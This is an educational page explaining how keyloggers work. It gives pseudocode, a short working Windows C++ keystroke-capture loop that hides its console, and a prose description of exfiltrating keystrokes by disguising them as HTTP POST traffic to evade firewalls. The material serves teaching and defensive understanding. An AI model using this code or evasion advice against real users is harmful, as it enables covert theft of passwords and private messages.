# Keyloggers

Keyloggers are a very basic type of malware that **record keystrokes.** They can be used by a malicious attacker to discover logins, outgoing messages, and anything else that a user would typically type. They are simple to program and simple to deploy, but also very easily detected by sophisticated antimalware services.

## Theory

Keyloggers can be thought of as a much more malicious and weaponized alternative to regular programs that take user keystrokes for input. For example, video games can take keystrokes such as WASD to control user movement. Keyloggers will typically use the same functions and basic algorithms, and the only thing really differentiating them is that they are created with malicious intent and will record these keystrokes instead of performing a user-intended action.

A basic algorithm for a keylogger may look like the following pseudocode:

```
detach from the console;
while true {
	for all ASCII characters {
		if the character is pressed {
			record the character;
		}
	}
}
```

In C++, this might be implemented in the following way on a Windows system:

```cpp
/* Detach from the console. */
FreeConsole();

while (true) {

	/* For printable ASCII characters. */
	for (char ascii = 32; ascii <= 126; ascii++) {

		/* If the character is pressed. */
		if (GetAsyncKeyState(ascii) == -32767) {

			/* Record the character. */
			FILE *f = fopen("keystrokes.log", "a");
			fprintf(f, "%c", ascii);
			fclose(f);
		}
	}
}
```

In case you're wondering why detaching from the console is necessary, this is so that the program can detect keystrokes while the console running the keylogger is in the background.

The source code of a demonstration C++ keylogger can be found [here](./samples/demo_keylogger_source.cpp). It is important to note that this program intentionally does not outline a particularly useful or practical keylogger. Instead, it merely demonstrates a basic algorithm for your own understanding.

## Keystroke Exfiltration Techniques

Keystrokes are often times exfiltrated to remote hosts through the internet or local network so that the attacker does not have to be physically present at the victim machine in order to retrieve the keystrokes. This can be done by hosting a server that the attacker can connect to that will serve the keystrokes. Alternatively, this can be done by having the program constantly try to connect to a remote server owned by an attacker and try to send the keystrokes there.

When being exfiltrated, the keystrokes are oftentimes encrypted to protect them from network security services. In addition, they may be disguised as HTTP traffic in order to make the traffic seem more legitimate and less likely to be blocked by firewalls. For example, an attacker could host a bin on a service like [PostBin](https://postb.in/) and the infected victim may send their keystrokes disguised as HTTP POST requests. This would be able to bypass whitelist-based outgoing firewall policies that allow HTTP traffic.
